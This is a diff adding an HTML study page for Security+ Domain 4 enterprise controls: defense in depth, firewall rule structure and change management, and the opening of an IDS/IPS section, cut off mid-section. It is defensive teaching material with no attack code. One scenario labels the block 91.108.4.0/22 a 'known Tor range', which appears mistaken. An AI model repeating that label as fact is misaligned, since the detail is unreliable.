@@ -1,0 +1,1968 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Enterprise Security Controls — Security+ Domain 4</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Syne:wght@400;500;600;700;800&family=DM+Mono:wght@300;400;500&display=swap');
+
+:root {
+  --bg:#f5f4f0;
+  --s1:#ffffff;
+  --s2:#edece8;
+  --s3:#e3e2dc;
+  --border:#d0cfc8;
+  --text:#1c1b16;
+  --muted:#7a7870;
+  --blue:#1a56db;
+  --green:#0a7c4e;
+  --red:#c0392b;
+  --orange:#c05621;
+  --purple:#6025a0;
+  --teal:#0c7c78;
+  --yellow:#92650a;
+  --indigo:#3730a3;
+  --rose:#b02060;
+  --slate:#475569;
+}
+
+*{margin:0;padding:0;box-sizing:border-box;}
+body{
+  background:var(--bg);
+  color:var(--text);
+  font-family:'Syne',sans-serif;
+  font-size:14px;
+  line-height:1.65;
+  padding:2rem 1.5rem;
+}
+
+.masthead{
+  text-align:center;
+  margin-bottom:2.5rem;
+  padding-bottom:1.5rem;
+  border-bottom:2px solid var(--border);
+}
+.masthead-eyebrow{
+  font-family:'DM Mono',monospace;
+  font-size:0.65rem;
+  letter-spacing:0.18em;
+  color:var(--muted);
+  text-transform:uppercase;
+  margin-bottom:0.5rem;
+}
+.masthead-title{
+  font-size:2.6rem;
+  font-weight:800;
+  letter-spacing:-0.04em;
+  color:var(--text);
+  line-height:1.05;
+  margin-bottom:0.4rem;
+}
+.masthead-title em{
+  font-style:normal;
+  color:var(--indigo);
+}
+.masthead-sub{
+  font-family:'DM Mono',monospace;
+  font-size:0.68rem;
+  color:var(--muted);
+}
+
+/* TABS */
+.tabs{display:flex;flex-wrap:wrap;gap:0.3rem;justify-content:center;margin-bottom:2rem;}
+.tab{
+  padding:0.42rem 0.95rem;
+  border-radius:6px;
+  border:1.5px solid var(--border);
+  background:var(--s1);
+  color:var(--muted);
+  cursor:pointer;
+  font-family:'DM Mono',monospace;
+  font-size:0.65rem;
+  font-weight:500;
+  transition:all 0.15s;
+  letter-spacing:0.02em;
+}
+.tab:hover{border-color:var(--indigo);color:var(--indigo);}
+.tab.active{background:var(--indigo);color:#fff;border-color:var(--indigo);}
+
+/* SECTION */
+.sec{display:none;}
+.sec.on{display:block;animation:rise 0.2s ease;}
+@keyframes rise{from{opacity:0;transform:translateY(6px);}to{opacity:1;transform:none;}}
+
+/* CARD */
+.card{
+  background:var(--s1);
+  border:1.5px solid var(--border);
+  border-radius:12px;
+  margin-bottom:1.5rem;
+  overflow:hidden;
+  box-shadow:0 2px 12px rgba(0,0,0,0.04);
+}
+.card-hd{
+  display:flex;
+  align-items:center;
+  gap:0.9rem;
+  padding:1.1rem 1.5rem;
+  border-bottom:1.5px solid var(--border);
+}
+.card-num{
+  font-family:'DM Mono',monospace;
+  font-size:0.6rem;
+  color:var(--muted);
+  background:var(--s2);
+  border:1px solid var(--border);
+  border-radius:4px;
+  padding:0.15rem 0.45rem;
+}
+.card-title{font-size:1.1rem;font-weight:700;letter-spacing:-0.02em;}
+.bdg{
+  margin-left:auto;
+  font-family:'DM Mono',monospace;
+  font-size:0.6rem;
+  padding:0.18rem 0.65rem;
+  border-radius:999px;
+  white-space:nowrap;
+  font-weight:500;
+}
+.bdg-blue{background:#dbeafe;color:#1e40af;border:1px solid #bfdbfe;}
+.bdg-green{background:#dcfce7;color:#166534;border:1px solid #bbf7d0;}
+.bdg-orange{background:#ffedd5;color:#9a3412;border:1px solid #fed7aa;}
+.bdg-red{background:#fee2e2;color:#991b1b;border:1px solid #fecaca;}
+.bdg-purple{background:#f3e8ff;color:#6b21a8;border:1px solid #e9d5ff;}
+.bdg-teal{background:#ccfbf1;color:#115e59;border:1px solid #99f6e4;}
+.bdg-indigo{background:#e0e7ff;color:#3730a3;border:1px solid #c7d2fe;}
+.bdg-rose{background:#ffe4e6;color:#9f1239;border:1px solid #fecdd3;}
+
+.card-bd{padding:1.5rem;}
+p{color:var(--muted);font-size:0.86rem;margin-bottom:0.8rem;line-height:1.7;}
+h3{
+  font-size:0.95rem;font-weight:700;color:var(--text);
+  margin:1.3rem 0 0.6rem;
+  padding-left:0.75rem;
+  border-left:3px solid var(--indigo);
+  letter-spacing:-0.01em;
+}
+
+/* CODE */
+.code{
+  background:var(--text);
+  color:#e8e6e0;
+  border-radius:8px;
+  padding:1rem 1.2rem;
+  font-family:'DM Mono',monospace;
+  font-size:0.69rem;
+  line-height:1.9;
+  overflow-x:auto;
+  margin:0.8rem 0;
+}
+.cg{color:#6ee7b7;} .cr{color:#fca5a5;} .cb{color:#93c5fd;}
+.co{color:#fcd34d;} .cp{color:#d8b4fe;} .cm{color:#6b7db3;}
+.ct{color:#5eead4;} .ci{color:#a5b4fc;} .cy{color:#fde68a;}
+.cpk{color:#f9a8d4;}
+
+/* SCENE */
+.scene{
+  background:#fefce8;
+  border-left:3px solid var(--yellow);
+  border-radius:0 8px 8px 0;
+  padding:1rem 1.2rem;
+  margin:1rem 0;
+}
+.scene-lbl{
+  font-family:'DM Mono',monospace;
+  font-size:0.6rem;
+  color:var(--yellow);
+  margin-bottom:0.4rem;
+  letter-spacing:0.1em;
+  font-weight:500;
+  text-transform:uppercase;
+}
+
+/* GRIDS */
+.g2{display:grid;grid-template-columns:1fr 1fr;gap:0.8rem;margin:0.8rem 0;}
+.g3{display:grid;grid-template-columns:repeat(3,1fr);gap:0.8rem;margin:0.8rem 0;}
+.g4{display:grid;grid-template-columns:repeat(4,1fr);gap:0.7rem;margin:0.8rem 0;}
+@media(max-width:640px){.g2,.g3,.g4{grid-template-columns:1fr;}}
+
+.gc{
+  background:var(--s2);
+  border:1.5px solid var(--border);
+  border-radius:10px;
+  padding:1rem;
+}
+.gc h4{font-size:0.85rem;font-weight:700;margin-bottom:0.4rem;letter-spacing:-0.01em;}
+.gc p{font-size:0.77rem;margin:0;}
+.gc ul{padding-left:1rem;margin-top:0.3rem;}
+.gc ul li{font-size:0.76rem;color:var(--muted);margin-bottom:0.25rem;}
+
+/* EXAM */
+.exam{
+  background:#f5f3ff;
+  border:1.5px solid #ddd6fe;
+  border-radius:10px;
+  padding:1rem 1.2rem;
+  margin-top:1rem;
+}
+.exam h4{
+  font-family:'DM Mono',monospace;
+  font-size:0.6rem;
+  color:var(--purple);
+  margin-bottom:0.6rem;
+  letter-spacing:0.1em;
+  font-weight:500;
+  text-transform:uppercase;
+}
+.er{display:flex;gap:0.5rem;margin-bottom:0.4rem;font-size:0.79rem;align-items:flex-start;}
+.ek{color:var(--purple);font-family:'DM Mono',monospace;font-size:0.67rem;flex-shrink:0;font-weight:500;}
+
+/* TABLE */
+table{width:100%;border-collapse:collapse;font-size:0.78rem;}
+th{
+  background:var(--s2);
+  padding:0.55rem 0.8rem;
+  text-align:left;
+  color:var(--muted);
+  border-bottom:1.5px solid var(--border);
+  font-size:0.68rem;
+  font-weight:600;
+  font-family:'DM Mono',monospace;
+  letter-spacing:0.04em;
+}
+td{padding:0.55rem 0.8rem;border-bottom:1px solid var(--border);}
+tr:last-child td{border-bottom:none;}
+tr:hover td{background:var(--s2);}
+
+.tag{
+  display:inline-block;
+  padding:0.1rem 0.45rem;
+  border-radius:4px;
+  font-size:0.6rem;
+  font-family:'DM Mono',monospace;
+  font-weight:500;
+}
+.tg{background:#dcfce7;color:#166534;}
+.tr{background:#fee2e2;color:#991b1b;}
+.tb{background:#dbeafe;color:#1e40af;}
+.to{background:#ffedd5;color:#9a3412;}
+.tp{background:#f3e8ff;color:#6b21a8;}
+.tt{background:#ccfbf1;color:#115e59;}
+.ti{background:#e0e7ff;color:#3730a3;}
+.ty{background:#fef9c3;color:#854d0e;}
+.trs{background:#ffe4e6;color:#9f1239;}
+
+/* INFO ROW */
+.info-row{
+  display:flex;align-items:flex-start;gap:0.8rem;
+  padding:0.8rem 1rem;
+  background:var(--s2);
+  border:1.5px solid var(--border);
+  border-radius:8px;
+  margin-bottom:0.5rem;
+}
+.info-icon{font-size:1.1rem;flex-shrink:0;margin-top:0.1rem;}
+.info-title{font-size:0.85rem;font-weight:700;margin-bottom:0.15rem;letter-spacing:-0.01em;}
+.info-desc{font-size:0.75rem;color:var(--muted);}
+
+/* FLOW */
+.flow{display:flex;align-items:center;flex-wrap:wrap;gap:0.4rem;margin:1rem 0;}
+.flow-box{
+  border-radius:7px;
+  padding:0.55rem 0.85rem;
+  font-size:0.72rem;
+  font-weight:600;
+  border:1.5px solid;
+  text-align:center;
+  min-width:88px;
+  font-family:'DM Mono',monospace;
+}
+.flow-arr{color:var(--muted);font-size:1rem;}
+
+/* RULE BUILDER */
+.rule-row{
+  display:grid;
+  grid-template-columns:80px 120px 120px 120px 1fr;
+  gap:0.5rem;
+  align-items:center;
+  padding:0.5rem 0.8rem;
+  border-radius:6px;
+  margin-bottom:0.3rem;
+  font-family:'DM Mono',monospace;
+  font-size:0.67rem;
+  border:1px solid var(--border);
+}
+.rule-row.hdr{
+  background:var(--s2);
+  font-weight:600;
+  color:var(--muted);
+  font-size:0.6rem;
+  letter-spacing:0.06em;
+}
+.rule-allow{background:#f0fdf4;}
+.rule-deny{background:#fef2f2;}
+@media(max-width:640px){.rule-row{grid-template-columns:1fr;}}
+
+/* COMPARISON STRIP */
+.cmp-strip{
+  display:flex;
+  gap:0;
+  border-radius:10px;
+  overflow:hidden;
+  border:1.5px solid var(--border);
+  margin:1rem 0;
+}
+.cmp-col{flex:1;padding:1rem;}
+.cmp-col+.cmp-col{border-left:1.5px solid var(--border);}
+.cmp-head{font-size:0.78rem;font-weight:700;margin-bottom:0.5rem;letter-spacing:-0.01em;}
+.cmp-item{font-size:0.74rem;color:var(--muted);padding:0.2rem 0;display:flex;gap:0.4rem;}
+.cmp-dot{flex-shrink:0;margin-top:0.3rem;width:6px;height:6px;border-radius:50%;}
+
+/* MATRIX */
+.matrix{display:grid;grid-template-columns:repeat(3,1fr);gap:0.5rem;margin:1rem 0;}
+@media(max-width:500px){.matrix{grid-template-columns:1fr;}}
+.m-cell{border-radius:8px;padding:0.9rem;font-size:0.72rem;border:1.5px solid;font-family:'DM Mono',monospace;}
+.m-cell strong{display:block;font-size:0.8rem;font-family:'Syne',sans-serif;margin-bottom:0.3rem;}
+
+/* STEP LIST */
+.step-list{counter-reset:steps;margin:0.8rem 0;}
+.step-item{
+  display:flex;gap:0.9rem;
+  padding:0.8rem 0;
+  border-bottom:1px solid var(--border);
+  align-items:flex-start;
+  counter-increment:steps;
+}
+.step-item:last-child{border-bottom:none;}
+.step-num{
+  width:28px;height:28px;border-radius:50%;
+  display:flex;align-items:center;justify-content:center;
+  font-family:'DM Mono',monospace;font-size:0.72rem;font-weight:600;
+  flex-shrink:0;
+}
+.step-title{font-size:0.85rem;font-weight:700;margin-bottom:0.15rem;letter-spacing:-0.01em;}
+.step-desc{font-size:0.77rem;color:var(--muted);}
+
+/* NAC POSTURE */
+.posture-card{
+  border-radius:10px;padding:1rem;
+  border:1.5px solid;margin-bottom:0.5rem;
+  display:flex;gap:1rem;align-items:flex-start;
+}
+.posture-icon{font-size:1.4rem;flex-shrink:0;}
+.posture-title{font-size:0.85rem;font-weight:700;margin-bottom:0.2rem;}
+.posture-desc{font-size:0.77rem;color:var(--muted);}
+
+/* DLP CHANNEL */
+.dlp-row{
+  display:flex;align-items:center;gap:1rem;
+  padding:0.7rem 1rem;border-radius:8px;
+  margin-bottom:0.4rem;border:1.5px solid;
+}
+.dlp-channel{font-weight:700;font-size:0.82rem;min-width:130px;}
+.dlp-desc{font-size:0.75rem;color:var(--muted);flex:1;}
+.dlp-action{font-family:'DM Mono',monospace;font-size:0.65rem;white-space:nowrap;}
+</style>
+</head>
+<body>
+
+<div class="masthead">
+  <div class="masthead-eyebrow">CompTIA Security+ SY0-701 — Domain 4</div>
+  <div class="masthead-title"><em>Enterprise</em> Security Controls</div>
+  <div class="masthead-sub">// Firewalls · IDS/IPS · DNS Filtering · DLP · NAC · EDR/XDR · Modification & Tuning</div>
+</div>
+
+<div class="tabs">
+  <button class="tab active" onclick="go('s1',this)">1. Overview</button>
+  <button class="tab" onclick="go('s2',this)">2. Firewalls</button>
+  <button class="tab" onclick="go('s3',this)">3. IDS / IPS</button>
+  <button class="tab" onclick="go('s4',this)">4. DNS Filtering</button>
+  <button class="tab" onclick="go('s5',this)">5. DLP</button>
+  <button class="tab" onclick="go('s6',this)">6. NAC</button>
+  <button class="tab" onclick="go('s7',this)">7. EDR / XDR</button>
+  <button class="tab" onclick="go('s8',this)">8. Tuning & Integration</button>
+  <button class="tab" onclick="go('s9',this)">📊 Summary</button>
+</div>
+
+<!-- ═══════════════════════════════ -->
+<!-- 1. OVERVIEW                    -->
+<!-- ═══════════════════════════════ -->
+<div class="sec on" id="s1">
+<div class="card">
+  <div class="card-hd"><span class="card-num">01</span><span class="card-title">Enterprise Security Controls — Overview</span><span class="bdg bdg-indigo">Defense in Depth</span></div>
+  <div class="card-bd">
+    <p>Enterprise security controls are the <strong style="color:var(--text)">tools and technologies that enforce security policy across an organization</strong>. No single control stops every attack — the goal is layered defense where each control catches what the others miss.</p>
+
+    <h3>Why Multiple Controls?</h3>
+    <div class="code">
+<span class="cm"># Defense in depth — every layer catches something different:</span>
+
+Attacker sends phishing email with malicious link:
+
+Layer 1 — Email Gateway:      scans attachment → <span class="cg">blocked (known malware)</span>
+  Attacker tries different payload — no signature match
+Layer 1 — Email Gateway:      <span class="cr">passes through (unknown payload)</span>
+
+Layer 2 — DNS Filtering:      user clicks link
+  DNS query to malicious domain → <span class="cg">blocked (known bad domain)</span>
+  Attacker uses new domain — not yet blacklisted
+Layer 2 — DNS Filtering:      <span class="cr">passes through (new domain)</span>
+
+Layer 3 — Firewall:           connection to attacker C2
+  Rule blocks port 4444 → <span class="cg">blocked</span>
+  Attacker switches to HTTPS/443
+Layer 3 — Firewall:           <span class="cr">passes (looks like normal HTTPS)</span>
+
+Layer 4 — IPS:                HTTPS traffic inspection
+  Signature matches exploit pattern → <span class="cg">blocked</span>
+  Attacker uses custom obfuscation
+Layer 4 — IPS:                <span class="cr">passes (novel technique)</span>
+
+Layer 5 — EDR:                payload executes on endpoint
+  Behavior: Word → PowerShell → network → C2
+  EDR: suspicious behavior chain → <span class="cg">KILL + ALERT ✓</span>
+
+<span class="cg">Five layers — attacker stopped at layer 5</span>
+<span class="cg">Each missed by earlier layers — caught by later ones</span>
+<span class="cm"># This is why you need ALL these controls</span>
+    </div>
+
+    <h3>The Six Enterprise Controls — At a Glance</h3>
+    <div class="g3">
+      <div class="gc" style="border-color:#bfdbfe">
+        <h4 style="color:var(--blue)">🔥 Firewall</h4>
+        <p>Controls network traffic by IP, port, protocol, application, and user identity. First and most fundamental control. Perimeter and internal enforcement.</p>
+      </div>
+      <div class="gc" style="border-color:#fecaca">
+        <h4 style="color:var(--red)">🚨 IDS / IPS</h4>
+        <p>Detects (IDS) or blocks (IPS) malicious traffic patterns in real time. Signature-based and behavioral. Inline or out-of-band.</p>
+      </div>
+      <div class="gc" style="border-color:#ccfbf1">
+        <h4 style="color:var(--teal)">🌐 DNS Filtering</h4>
+        <p>Blocks access to malicious, inappropriate, or unauthorized domains at the DNS resolution layer. First layer of web access control.</p>
+      </div>
+      <div class="gc" style="border-color:#fed7aa">
+        <h4 style="color:var(--orange)">🛑 DLP</h4>
+        <p>Prevents sensitive data from leaving the organization. Monitors email, web uploads, USB transfers, cloud storage, and printing.</p>
+      </div>
+      <div class="gc" style="border-color:#bbf7d0">
+        <h4 style="color:var(--green)">🔐 NAC</h4>
+        <p>Controls who and what can access the network. Verifies device health before granting access. Quarantines non-compliant devices.</p>
+      </div>
+      <div class="gc" style="border-color:#e9d5ff">
+        <h4 style="color:var(--purple)">🖥️ EDR / XDR</h4>
+        <p>Behavior-based endpoint monitoring and response. Detects threats by what they do. Automated response capabilities.</p>
+      </div>
+    </div>
+
+    <h3>Where Each Control Lives in the Network</h3>
+    <div class="code">
+<span class="cm"># Network topology — where controls sit:</span>
+
+INTERNET
+    ↓
+[Perimeter Firewall]    ← filters by IP/port/protocol
+    ↓
+[IPS — inline]          ← blocks malicious traffic patterns
+    ↓
+[DNS Sinkhole/Filter]   ← blocks bad domains before connection
+    ↓
+[DMZ]
+  └─ Web/Email servers
+    ↓
+[Internal Firewall]     ← controls segment-to-segment traffic
+    ↓
+INTERNAL NETWORK
+    ↓
+[NAC]                   ← checks device before network access
+    ↓
+[End User Devices]
+  └─ EDR agent          ← behavior monitoring on every device
+    ↓
+[DLP — endpoint]        ← controls what data leaves the device
+
+<span class="cm"># Also:</span>
+[DLP — network]         ← monitors email and web uploads
+[DLP — cloud]           ← monitors SaaS data movement
+[SIEM]                  ← correlates logs from ALL the above
+    </div>
+
+    <div class="exam">
+      <h4>// Exam Keywords</h4>
+      <div class="er"><span class="ek">Defense in depth →</span><span>Layered controls — each catches what others miss</span></div>
+      <div class="er"><span class="ek">No single control →</span><span>Every enterprise control has gaps — layers compensate</span></div>
+      <div class="er"><span class="ek">Security architecture →</span><span>Right control at the right layer — perimeter, network, endpoint, data</span></div>
+    </div>
+  </div>
+</div>
+</div>
+
+<!-- ═══════════════════════════════ -->
+<!-- 2. FIREWALLS                   -->
+<!-- ═══════════════════════════════ -->
+<div class="sec" id="s2">
+<div class="card">
+  <div class="card-hd"><span class="card-num">02</span><span class="card-title">Modifying Firewall Rules & Policies</span><span class="bdg bdg-blue">Rules · Zones · ACLs</span></div>
+  <div class="card-bd">
+    <p>Firewalls are only as good as their rules. <strong style="color:var(--text)">Modifying firewalls</strong> means adding, changing, or removing rules to respond to new threats, new services, business changes, or discovered misconfigurations — all through a formal change management process.</p>
+
+    <h3>Firewall Rule Structure</h3>
+    <div class="rule-row hdr">
+      <div>Priority</div><div>Source</div><div>Destination</div><div>Port/Protocol</div><div>Action + Log</div>
+    </div>
+    <div class="rule-row rule-allow">
+      <span class="tag tb">100</span>
+      <span style="font-family:'DM Mono',monospace;font-size:0.67rem">10.0.1.0/24</span>
+      <span style="font-family:'DM Mono',monospace;font-size:0.67rem">any</span>
+      <span style="font-family:'DM Mono',monospace;font-size:0.67rem">TCP 443</span>
+      <span style="color:var(--green);font-family:'DM Mono',monospace;font-size:0.67rem">ALLOW — log disabled</span>
+    </div>
+    <div class="rule-row rule-allow">
+      <span class="tag tb">200</span>
+      <span style="font-family:'DM Mono',monospace;font-size:0.67rem">10.0.0.0/8</span>
+      <span style="font-family:'DM Mono',monospace;font-size:0.67rem">10.0.2.50</span>
+      <span style="font-family:'DM Mono',monospace;font-size:0.67rem">TCP 3306</span>
+      <span style="color:var(--green);font-family:'DM Mono',monospace;font-size:0.67rem">ALLOW — log enabled</span>
+    </div>
+    <div class="rule-row rule-deny">
+      <span class="tag to">300</span>
+      <span style="font-family:'DM Mono',monospace;font-size:0.67rem">any</span>
+      <span style="font-family:'DM Mono',monospace;font-size:0.67rem">any</span>
+      <span style="font-family:'DM Mono',monospace;font-size:0.67rem">TCP 23</span>
+      <span style="color:var(--red);font-family:'DM Mono',monospace;font-size:0.67rem">DENY Telnet — log enabled</span>
+    </div>
+    <div class="rule-row rule-deny">
+      <span class="tag tr">999</span>
+      <span style="font-family:'DM Mono',monospace;font-size:0.67rem">any</span>
+      <span style="font-family:'DM Mono',monospace;font-size:0.67rem">any</span>
+      <span style="font-family:'DM Mono',monospace;font-size:0.67rem">any</span>
+      <span style="color:var(--red);font-family:'DM Mono',monospace;font-size:0.67rem">DENY all — implicit deny</span>
+    </div>
+
+    <h3>Implicit Deny — Most Important Firewall Concept</h3>
+    <div class="code">
+<span class="cm"># Default firewall behavior:</span>
+Rules evaluated TOP to BOTTOM
+First matching rule wins → action applied
+No rule matches → <span class="cr">IMPLICIT DENY — traffic blocked</span>
+
+<span class="cm"># This means:</span>
+Everything NOT explicitly allowed is DENIED
+Firewall starts in "deny all" state
+You add ALLOW rules for legitimate traffic
+Anything you forget to allow → blocked
+<span class="cg">Secure by default ✓</span>
+
+<span class="cm"># Common mistake:</span>
+Admin creates: ALLOW any → any (for testing)
+Forgets to remove it
+<span class="cr">All traffic allowed — firewall is useless ✗</span>
+    </div>
+
+    <h3>Types of Firewall Modifications</h3>
+    <div class="g2">
+      <div class="gc">
+        <h4 style="color:var(--blue)">Adding New Rules</h4>
+        <p>New service deployed, new business requirement, incident response requires blocking threat actor IPs. Must be specific — avoid overly broad rules. Proper change request required. Test in staging first.</p>
+        <div class="code" style="font-size:0.65rem;margin-top:0.5rem">
+<span class="cm"># New web app deployed — add rule:</span>
+<span class="cm"># Before:</span>
+DENY any → WebServer:8080
+
+<span class="cm"># Change request approved:</span>
+INSERT rule 150:
+ALLOW 10.1.0.0/24 → WebServer:8080 TCP
+<span class="cm"># Only allow internal subnet, not internet</span>
+        </div>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--red)">Blocking Threats</h4>
+        <p>Incident response: block attacker IP immediately. Block countries with no business relationship. Block known-malicious IP ranges (threat intelligence feeds). Block specific attack patterns via application firewall rules.</p>
+        <div class="code" style="font-size:0.65rem;margin-top:0.5rem">
+<span class="cm"># Active attack — emergency rule:</span>
+INSERT rule 10 (highest priority):
+DENY 185.220.101.0/24 → any any
+<span class="cm"># Block known Tor exit node range</span>
+<span class="cm"># Log every attempt</span>
+        </div>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--orange)">Rule Cleanup / Optimization</h4>
+        <p>Unused rules accumulate over time. Shadowed rules (higher rule already covers it — lower rule never fires). Overly broad rules that should be tightened. Firewall rule review should be quarterly.</p>
+        <div class="code" style="font-size:0.65rem;margin-top:0.5rem">
+<span class="cm"># Rule audit findings:</span>
+Rule 250: ALLOW any→any TCP 80 (2018)
+  Last match: <span class="cr">never</span> → <span class="cr">DELETE</span>
+
+Rule 300: ALLOW 10.0.0.0/8→DB TCP 3306
+  Should be: 10.1.5.20→DB TCP 3306
+  → <span class="co">TIGHTEN — least privilege</span>
+        </div>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--green)">Zone-Based Changes</h4>
+        <p>Moving a server from DMZ to internal. Creating new network segment. Changing trust relationships between zones. Updating inter-VLAN routing policies. Adjusting what DMZ can reach internally.</p>
+      </div>
+    </div>
+
+    <h3>Firewall Zones and Traffic Flow</h3>
+    <div class="code">
+<span class="cm"># Standard enterprise zone model:</span>
+
+UNTRUST (Internet):
+  No trust — treat all as hostile
+  Deny by default
+  Only allow inbound to DMZ specific services
+
+DMZ (Demilitarized Zone):
+  Semi-trusted — publicly accessible servers
+  Web servers, email servers, DNS servers
+  Allow: Internet → DMZ (specific ports only)
+  Allow: DMZ → Internal (limited, specific)
+  DENY: DMZ → Internal (all others)
+  DENY: Internet → Internal (all)
+
+TRUST (Internal):
+  Trusted — employees and corporate systems
+  Allow: Internal → Internet (via proxy)
+  Allow: Internal → DMZ (management)
+  Restrict: Internal segment → segment (microseg)
+
+OT/IoT Zone (if applicable):
+  Isolated — factory floor, building systems
+  Allow: Monitoring only → internal
+  DENY: OT → Internet (strict)
+  Air gap or data diode preferred
+
+<span class="cm"># Key rule: DMZ → Internal should be minimal</span>
+<span class="cm"># Compromised DMZ server should NOT reach AD</span>
+    </div>
+
+    <h3>NGFW-Specific Modifications</h3>
+    <div class="g3">
+      <div class="gc">
+        <h4 style="color:var(--blue)">Application Control</h4>
+        <p>Block specific apps regardless of port. Block Dropbox personal (allow Dropbox Business). Block TikTok, gaming, streaming. Block Tor browser. Identify by deep packet inspection not just port number.</p>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--teal)">User-Based Rules</h4>
+        <p>Rules tied to AD identity not IP address. Finance group → allow finance servers. Marketing → block code repositories. Contractors → block sensitive file shares. IP changes — policy follows user.</p>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--orange)">SSL Inspection Policy</h4>
+        <p>Decrypt and inspect HTTPS traffic. Bypass: banking sites, health sites (privacy). Inspect: social media, file sharing, general browsing. Certificate installed on endpoints to prevent browser warnings.</p>
+      </div>
+    </div>
+
+    <h3>Firewall Rule Change Management Process</h3>
+    <div class="step-list">
+      <div class="step-item">
+        <div class="step-num" style="background:#dbeafe;color:#1e40af">1</div>
+        <div><div class="step-title" style="color:var(--blue)">Request Submitted</div><div class="step-desc">Business owner or IT submits change request — what rule, why needed, impact assessment, risk level, rollback plan.</div></div>
+      </div>
+      <div class="step-item">
+        <div class="step-num" style="background:#f3e8ff;color:#6b21a8">2</div>
+        <div><div class="step-title" style="color:var(--purple)">Security Review</div><div class="step-desc">Security team reviews: does this open unnecessary risk? Does it follow least privilege? Is there a safer way to achieve the goal?</div></div>
+      </div>
+      <div class="step-item">
+        <div class="step-num" style="background:#fef9c3;color:#854d0e">3</div>
+        <div><div class="step-title" style="color:var(--yellow)">CAB Approval</div><div class="step-desc">Change Advisory Board approves. Emergency changes use emergency CAB process (faster). Standard changes go through weekly CAB.</div></div>
+      </div>
+      <div class="step-item">
+        <div class="step-num" style="background:#dcfce7;color:#166534">4</div>
+        <div><div class="step-title" style="color:var(--green)">Test in Staging</div><div class="step-desc">Apply rule to test firewall first. Verify legitimate traffic still works. Verify blocked traffic is blocked. No surprises in production.</div></div>
+      </div>
+      <div class="step-item">
+        <div class="step-num" style="background:#ffedd5;color:#9a3412">5</div>
+        <div><div class="step-title" style="color:var(--orange)">Production Implementation</div><div class="step-desc">Apply during maintenance window (or immediately for emergencies). Document exact rule applied. Screenshot before/after configuration.</div></div>
+      </div>
+      <div class="step-item">
+        <div class="step-num" style="background:#ccfbf1;color:#115e59">6</div>
+        <div><div class="step-title" style="color:var(--teal)">Validate & Document</div><div class="step-desc">Test that new rule works as expected. Close change ticket. Update firewall rule documentation. Set review date if temporary rule.</div></div>
+      </div>
+    </div>
+
+    <div class="scene">
+      <div class="scene-lbl">// Scenario — Emergency Block During Active Attack</div>
+      <p style="margin:0;color:var(--text);font-size:0.83rem">SOC detects active brute-force attack against VPN from a specific IP range. Security engineer implements emergency firewall modification.</p>
+      <div class="code">
+<span class="cm"># 02:14 AM — SOC alert: VPN brute force from 91.108.4.0/22</span>
+
+<span class="cb">Immediate action (emergency change, no CAB wait):</span>
+1. Access firewall management console
+2. INSERT rule at priority 5 (before all others):
+   DENY src:91.108.4.0/22 dst:any port:any
+   Action: DROP + LOG
+
+3. Verify: VPN login attempts from that range → stopped ✓
+4. Normal VPN users: unaffected ✓
+
+<span class="cb">Documentation (filed within 1 hour of emergency change):</span>
+  Change ticket: CHG-2024-8847
+  Rule added: block 91.108.4.0/22
+  Reason: active brute force attack
+  Duration: permanent until further review
+  Approver: CISO (emergency authorization)
+
+<span class="cb">48-hour review:</span>
+  Attack stopped: <span class="cg">yes ✓</span>
+  False positives: <span class="cg">none reported ✓</span>
+  Rule status: kept permanent (known Tor range)
+      </div>
+    </div>
+
+    <div class="exam">
+      <h4>// Exam Keywords</h4>
+      <div class="er"><span class="ek">Implicit deny →</span><span>Default block-all — everything not explicitly allowed is denied</span></div>
+      <div class="er"><span class="ek">Rule order →</span><span>Rules evaluated top to bottom — first match wins</span></div>
+      <div class="er"><span class="ek">Least privilege rules →</span><span>Specific source, destination, port — not allow any→any</span></div>
+      <div class="er"><span class="ek">DMZ → Internal →</span><span>Should be minimal — compromised DMZ should not reach internal AD</span></div>
+      <div class="er"><span class="ek">Rule cleanup →</span><span>Remove unused rules quarterly — unused = attack surface</span></div>
+      <div class="er"><span class="ek">Change management →</span><span>All firewall changes through formal process — emergency process for incidents</span></div>
+      <div class="er"><span class="ek">NGFW user rules →</span><span>Rules by AD identity not IP — policy follows user wherever they log in</span></div>
+    </div>
+  </div>
+</div>
+</div>
+
+<!-- ═══════════════════════════════ -->
+<!-- 3. IDS / IPS                   -->
+<!-- ═══════════════════════════════ -->
+<div class="sec" id="s3">
+<div class="card">
+  <div class="card-hd"><span class="card-num">03</span><span class="card-title">Modifying IDS / IPS</span><span class="bdg bdg-red">Signatures · Rules · Tuning</span></div>
+  <div class="card-bd">
+    <p>IDS/IPS systems require <strong style="color:var(--text)">continuous tuning</strong> to remain effective. Out-of-the-box, they generate massive false positive noise. Over time, rules become stale. New threats need new signatures. Tuning is the difference between a useful tool and a noisy distraction.</p>
+
+    <h3>IDS vs IPS — Key Difference Recap</h3>
+    <div class="cmp-strip">
+      <div class="cmp-col" style="background:#eff6ff">
+        <div class="cmp-head" style="color:var(--blue)">IDS — Detection Only</div>
+        <div class="cmp-item"><div class="cmp-dot" style="background:var(--blue)"></div><span>Out of band — copy of traffic</span></div>
+        <div class="cmp-item"><div class="cmp-dot" style="background:var(--blue)"></div><span>Alerts only — cannot block</span></div>
+        <div class="cmp-item"><div class="cmp-dot" style="background:var(--blue)"></div><span>No impact on performance</span></div>
+        <div class="cmp-item"><div class="cmp-dot" style="background:var(--blue)"></div><span>False positives = wasted alerts</span></div>
+        <div class="cmp-item"><div class="cmp-dot" style="background:var(--blue)"></div><span>Placed on SPAN port or TAP</span></div>
+      </div>
+      <div class="cmp-col" style="background:#fef2f2">
+        <div class="cmp-head" style="color:var(--red)">IPS — Detection + Prevention</div>
+        <div class="cmp-item"><div class="cmp-dot" style="background:var(--red)"></div><span>Inline — all traffic through it</span></div>
+        <div class="cmp-item"><div class="cmp-dot" style="background:var(--red)"></div><span>Alerts AND blocks traffic</span></div>
+        <div class="cmp-item"><div class="cmp-dot" style="background:var(--red)"></div><span>Performance impact possible</span></div>
+        <div class="cmp-item"><div class="cmp-dot" style="background:var(--red)"></div><span>False positives = blocked legit traffic!</span></div>
+        <div class="cmp-item"><div class="cmp-dot" style="background:var(--red)"></div><span>Placed between network zones</span></div>
+      </div>
+    </div>
+
+    <h3>Detection Methods</h3>
+    <div class="g2">
